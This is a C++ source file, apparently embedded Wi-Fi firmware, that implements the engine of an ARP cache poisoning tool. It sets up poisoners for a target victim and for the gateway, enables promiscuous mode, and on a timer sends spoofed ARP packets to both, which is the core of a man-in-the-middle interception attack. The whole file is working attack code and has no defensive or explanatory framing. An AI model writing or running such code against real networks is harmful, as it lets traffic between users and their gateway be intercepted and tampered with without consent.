#include "arp_engine.h"
#include "config.h"
#include "wifi_manager.h"
#include "packet_forwarder.h"
#include "arp_poisoner.hpp"

static bool s_running = false;
static unsigned long s_last_arp = 0;
static ARP_poisoner* s_poisoner_victim = nullptr;
static ARP_poisoner* s_poisoner_gateway = nullptr;

void arp_engine_init() {
    s_running = false;
    s_poisoner_victim = nullptr;
    s_poisoner_gateway = nullptr;
}

void arp_engine_start() {
    if (!config_validate() || !wifi_manager_is_connected()) {
        Serial.println("[ARP] Cannot start");
        return;
    }
    if (s_poisoner_victim) delete s_poisoner_victim;
    if (s_poisoner_gateway) delete s_poisoner_gateway;

    s_poisoner_victim = new ARP_poisoner();
    s_poisoner_gateway = new ARP_poisoner(g_target_ip_bin);

    promiscuous_ref_add();
    s_running = true;
    s_last_arp = millis();
    Serial.println("[ARP] ON");
}

void arp_engine_stop() {
    s_running = false;
    promiscuous_ref_remove();
    if (s_poisoner_victim) { delete s_poisoner_victim; s_poisoner_victim = nullptr; }
    if (s_poisoner_gateway) { delete s_poisoner_gateway; s_poisoner_gateway = nullptr; }
    Serial.println("[ARP] OFF");
}

bool arp_engine_is_running() {
    return s_running;
}

void arp_engine_task() {
    if (!s_running) return;
    if (millis() - s_last_arp < (unsigned long)g_config.arp_cooldown_ms) return;
    s_last_arp = millis();

    if (s_poisoner_victim) {
        s_poisoner_victim->send_arp_packet(g_target_ip_bin, g_target_mac_bin);
    }
    if (s_poisoner_gateway) {
        s_poisoner_gateway->send_arp_packet(g_gateway_ip_bin, g_gateway_mac_bin);
    }
}
